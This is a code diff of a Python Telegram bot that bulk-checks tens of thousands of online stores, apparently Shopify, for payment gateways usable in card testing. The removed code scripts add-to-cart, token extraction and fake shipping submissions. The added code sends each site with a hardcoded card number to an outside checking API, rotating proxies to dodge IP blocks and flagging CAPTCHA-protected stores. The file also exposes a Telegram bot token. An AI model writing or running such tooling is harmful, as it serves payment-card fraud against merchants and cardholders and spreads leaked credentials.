@@ -4,30 +4,26 @@ import threading
 import time
 import random
 import os
-import uuid
 import logging
 import gc
-import json
 import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
-from bs4 import BeautifulSoup
 from flask import Flask
 from fake_useragent import UserAgent
-from urllib.parse import urlparse
 import urllib3
 urllib3.disable_warnings()
 
 # ==========================================
-# 🎯 ULTRA BULK SITE CHECKER v4.1 - IMPROVED
+# 🎯 ULTRA BULK SITE CHECKER v5 - APP.PY METHOD
 # ==========================================
 BOT_TOKEN = "8468244120:AAGXjaczSUzqCF9xTRtoShEzhmx406XEhCE"
 OWNER_ID = 5963548505
 
 MAX_THREADS = 150
 CHUNK_SIZE = 200
-REQUEST_TIMEOUT = 8
+REQUEST_TIMEOUT = 15
 BATCH_SEND = 15
 PROXY_CHECK_THREADS = 100
 
@@ -76,7 +72,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return f"🎯 ULTRA v4.1 | Verified: {len(VERIFIED_PROXIES)} | Saved", 200
+    return f"🎯 ULTRA v5 | Verified: {len(VERIFIED_PROXIES)} | App.py Method", 200
 
 def run_web_server():
     port = int(os.environ.get("PORT", 8080))
@@ -140,24 +136,6 @@ def test_proxy_quick_connect(proxy):
     except:
         return False
 
-def format_proxy(proxy_str):
-    """Format proxy string to proper format"""
-    proxy_str = proxy_str.strip()
-    
-    if ':' not in proxy_str:
-        return None
-    
-    parts = proxy_str.split(':')
-    
-    if len(parts) == 4:
-        ip, port, user, pwd = parts
-        return f"http://{user}:{pwd}@{ip}:{port}"
-    elif len(parts) == 2:
-        ip, port = parts
-        return f"http://{ip}:{port}"
-    
-    return None
-
 def verify_proxy_batch(proxies, message=None):
     """Verify multiple proxies in parallel and AUTO-SAVE"""
     global VERIFIED_PROXIES
@@ -205,205 +183,77 @@ def verify_proxy_batch(proxies, message=None):
     return verified
 
 # ==========================================
-# 🔍 ADVANCED SITE CHECKER (IMPROVED)
+# 🔍 SITE CHECKER (APP.PY METHOD)
 # ==========================================
 
-def find_between(data, first, last):
-    """Extract text between two strings"""
+def check_site_ultra(site_url, proxy=None):
+    """ULTRA site checker - USING EXTERNAL API (FROM app.py METHOD)"""
     try:
-        start = data.index(first) + len(first)
-        end = data.index(last, start)
-        return data[start:end]
-    except:
-        return None
-
-def create_session_ultra():
-    """Create optimized session with verified proxies"""
-    session = requests.Session()
-    
-    if VERIFIED_PROXIES:
-        proxy = random.choice(VERIFIED_PROXIES)
-        proxy_url = format_proxy(proxy)
-        if proxy_url:
-            session.proxies = {"http": proxy_url, "https": proxy_url}
-    
-    retries = Retry(total=2, backoff_factor=0.2, status_forcelist=[500, 502, 503, 504])
-    adapter = HTTPAdapter(max_retries=retries, pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS)
-    session.mount("https://", adapter)
-    session.mount("http://", adapter)
-    
-    return session
-
-def check_site_ultra(site_url):
-    """ULTRA site checker - IMPROVED DETECTION"""
-    try:
-        session = create_session_ultra()
         site_url = site_url.strip()
-        
-        if not site_url.startswith('http'):
-            site_url = f"https://{site_url}"
-        
+        if site_url.startswith('https://'):
+            site_url = site_url.replace('https://', '')
+        if site_url.startswith('http://'):
+            site_url = site_url.replace('http://', '')
         site_url = site_url.rstrip('/')
+        
+        # Use external API like app.py does
+        test_cc = "5242430428405662|03|2025|328"  # Test card
+        api_url = f"https://autoshopify.stormx.pw/index.php?site={site_url}&cc={test_cc}"
         
         headers = {
             'User-Agent': USER_AGENTS.random,
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept': 'application/json, text/javascript, */*',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate',
-            'DNT': '1',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
         }
         
-        # STEP 1: Homepage check
         try:
-            r = session.get(site_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
-            if r.status_code >= 500:
-                return ("DEAD", "500 Error", "N/A")
-            if r.status_code == 403:
+            if proxy:
+                proxy_parts = proxy.split(':')
+                if len(proxy_parts) == 4:
+                    proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
+                elif len(proxy_parts) == 2:
+                    proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
+                else:
+                    proxy_url = None
+                
+                if proxy_url:
+                    proxy_dict = {'http': proxy_url, 'https': proxy_url}
+                    response = requests.get(api_url, headers=headers, proxies=proxy_dict, timeout=REQUEST_TIMEOUT, verify=False)
+                else:
+                    response = requests.get(api_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            else:
+                response = requests.get(api_url, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
+            
+            if response.status_code == 200:
+                try:
+                    data = response.json()
+                    api_response = data.get('Response', '').upper()
+                    gateway = data.get('Gateway', 'Unknown')
+                    
+                    # Check responses
+                    if any(x in api_response for x in ["THANK YOU", "APPROVED", "GATEWAY"]):
+                        return ("LIVE", "Gateway Detected", gateway)
+                    elif "CAPTCHA" in api_response or "CHALLENGE" in api_response:
+                        return ("CAPTCHA", "CAPTCHA Protected", gateway)
+                    elif "GATED" in api_response or "LOCKED" in api_response:
+                        return ("GATED", "Products Locked", gateway)
+                    elif any(x in api_response for x in ["DECLINED", "EXPIRED", "INVALID"]):
+                        return ("DEAD", api_response[:30], gateway)
+                    else:
+                        return ("DEAD", api_response[:30], gateway)
+                except:
+                    return ("DEAD", "Invalid Response", "N/A")
+            elif response.status_code == 403:
                 return ("BLOCKED", "IP Blocked", "N/A")
-            if r.status_code == 404:
-                return ("DEAD", "404 Not Found", "N/A")
+            elif response.status_code == 404:
+                return ("DEAD", "Not Found", "N/A")
+            else:
+                return ("DEAD", f"HTTP {response.status_code}", "N/A")
+        
         except requests.exceptions.Timeout:
             return ("DEAD", "Timeout", "N/A")
         except Exception as e:
-            return ("DEAD", "Connect Error", "N/A")
-        
-        # STEP 2: Try both JSON and HTML products
-        variant_id = None
-        product_found = False
-        
-        # Try JSON API first
-        try:
-            for limit in [50, 100, 250]:
-                prod_json = session.get(f"{site_url}/products.json?limit={limit}", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
-                if prod_json.status_code == 200:
-                    try:
-                        data = prod_json.json()
-                        products = data.get('products', [])
-                        if products:
-                            product_found = True
-                            for p in products:
-                                for v in p.get('variants', []):
-                                    if v.get('available'):
-                                        variant_id = v.get('id')
-                                        break
-                                if variant_id:
-                                    break
-                            if variant_id:
-                                break
-                    except:
-                        pass
-        except:
-            pass
-        
-        # Try HTML products page
-        if not product_found:
-            try:
-                prod_page = session.get(f"{site_url}/products", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
-                if prod_page.status_code == 200 and len(prod_page.text) > 500:
-                    if "product" in prod_page.text.lower() or "variant" in prod_page.text.lower():
-                        product_found = True
-                        # Try to extract variant from HTML
-                        variants = re.findall(r'"id":(\d+)', prod_page.text)
-                        if variants:
-                            variant_id = variants[0]
-            except:
-                pass
-        
-        if not product_found:
-            return ("DEAD", "No Products Found", "N/A")
-        
-        if not variant_id:
-            return ("GATED", "Products Locked/No Variants", "N/A")
-        
-        # STEP 3: Add to cart
-        try:
-            cart_headers = headers.copy()
-            cart_headers['X-Requested-With'] = 'XMLHttpRequest'
-            
-            cart = session.post(
-                f"{site_url}/cart/add.js",
-                data={'id': variant_id, 'quantity': 1},
-                headers=cart_headers,
-                timeout=REQUEST_TIMEOUT,
-                verify=False
-            )
-        except:
-            return ("DEAD", "Cart Failed", "N/A")
-        
-        # STEP 4: Checkout page
-        try:
-            checkout = session.get(f"{site_url}/checkout", headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
-            
-            captcha_check = checkout.text.lower()
-            if any(x in captcha_check for x in ["captcha", "challenge", "recaptcha", "hcaptcha", "cf_challenge", "cloudflare", "turnstile"]):
-                return ("CAPTCHA", "CAPTCHA Protected", "N/A")
-            
-            checkout_url = checkout.url
-        except:
-            return ("DEAD", "Checkout Failed", "N/A")
-        
-        # STEP 5: Extract auth token
-        auth_token = find_between(checkout.text, 'name="authenticity_token" value="', '"')
-        
-        if not auth_token:
-            try:
-                soup = BeautifulSoup(checkout.text, 'html.parser')
-                token_elem = soup.find('input', {'name': 'authenticity_token'})
-                if token_elem:
-                    auth_token = token_elem.get('value')
-            except:
-                pass
-        
-        if not auth_token:
-            return ("DEAD", "No Auth Token", "N/A")
-        
-        # STEP 6: Submit shipping
-        ship_data = {
-            '_method': 'patch',
-            'authenticity_token': auth_token,
-            'previous_step': 'contact_information',
-            'step': 'shipping_method',
-            'checkout[email]': f"test{random.randint(10000,99999)}@gmail.com",
-            'checkout[shipping_address][first_name]': 'Test',
-            'checkout[shipping_address][last_name]': 'User',
-            'checkout[shipping_address][address1]': f"{random.randint(100,999)} Main St",
-            'checkout[shipping_address][city]': 'New York',
-            'checkout[shipping_address][country]': 'US',
-            'checkout[shipping_address][province]': 'NY',
-            'checkout[shipping_address][zip]': '10001',
-            'checkout[shipping_address][phone]': f"+1{random.randint(2000000000,9999999999)}"
-        }
-        
-        try:
-            ship_req = session.post(checkout_url, data=ship_data, headers=headers, timeout=REQUEST_TIMEOUT, verify=False)
-            
-            if "captcha" in ship_req.text.lower() or "challenge" in ship_req.url.lower():
-                return ("CAPTCHA", "CAPTCHA at Shipping", "N/A")
-            
-            if ship_req.status_code >= 500:
-                return ("DEAD", "Server Error at Shipping", "N/A")
-        except:
-            return ("DEAD", "Shipping Submit Failed", "N/A")
-        
-        # STEP 7: Get payment gateway
-        gateway_id = find_between(ship_req.text, 'name="checkout[payment_gateway]" value="', '"')
-        
-        if not gateway_id:
-            try:
-                soup = BeautifulSoup(ship_req.text, 'html.parser')
-                gw_elem = soup.find('input', {'name': 'checkout[payment_gateway]'})
-                if gw_elem:
-                    gateway_id = gw_elem.get('value')
-            except:
-                pass
-        
-        if not gateway_id:
-            return ("GATED", "No Payment Gateway", "N/A")
-        
-        # GATEWAY DETECTED = LIVE ✅
-        return ("LIVE", "Gateway Detected", gateway_id)
+            return ("DEAD", str(e)[:20], "N/A")
     
     except Exception as e:
         return ("ERROR", str(e)[:30], "N/A")
@@ -437,7 +287,10 @@ def run_ultra_bulk_check(message, sites):
     
     for chunk_idx, chunk in enumerate(chunks):
         with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-            futures = {executor.submit(check_site_ultra, site): site for site in chunk}
+            futures = {}
+            for site in chunk:
+                proxy = random.choice(VERIFIED_PROXIES) if VERIFIED_PROXIES else None
+                futures[executor.submit(check_site_ultra, site, proxy)] = site
             
             for future in as_completed(futures):
                 try:
@@ -532,14 +385,14 @@ def send_batch_results(chat_id, sites, total):
 @bot.message_handler(commands=['start'])
 def start(m):
     bot.reply_to(m, """
-🎯 <b>ULTRA BULK SITE CHECKER v4.1</b>
+🎯 <b>ULTRA BULK SITE CHECKER v5</b>
 
 ✅ <b>FEATURES:</b>
 • Check 40K+ sites ULTRA FAST
 • 150 parallel threads
 • Proxy verification (100 parallel)
 • 💾 AUTO-SAVE verified proxies
-• Multi-variant detection
+• External API checking (app.py method)
 • Real gateway detection
 • Advanced CAPTCHA detection
 
@@ -613,6 +466,7 @@ def show_stats(m):
 ⚙️ Max Threads: <code>{MAX_THREADS}</code>
 🔄 Chunk Size: <code>{CHUNK_SIZE}</code>
 ⏱️ Timeout: <code>{REQUEST_TIMEOUT}s</code>
+🔧 Method: <code>External API (app.py)</code>
 """, parse_mode='HTML')
 
 @bot.message_handler(content_types=['document'])
@@ -644,9 +498,9 @@ def handle_file(m):
             formatted_sites = []
             for line in site_lines:
                 if not line.startswith('http'):
-                    formatted_sites.append(f"https://{line}")
-                else:
                     formatted_sites.append(line)
+                else:
+                    formatted_sites.append(line.replace('https://', '').replace('http://', ''))
             
             bot.reply_to(m, f"📥 <b>✅ {len(formatted_sites)} SITES DETECTED</b>\n🎯 Starting check!", parse_mode='HTML')
             threading.Thread(target=run_ultra_bulk_check, args=(m, formatted_sites), daemon=True).start()
@@ -659,6 +513,6 @@ def handle_file(m):
 
 if __name__ == "__main__":
     initial_count = load_verified_proxies()
-    logger.info(f"🎯 ULTRA CHECKER v4.1 STARTED - {initial_count} proxies loaded")
+    logger.info(f"🎯 ULTRA CHECKER v5 STARTED - {initial_count} proxies loaded - Using External API Method")
     start_keep_alive()
     bot.infinity_polling()
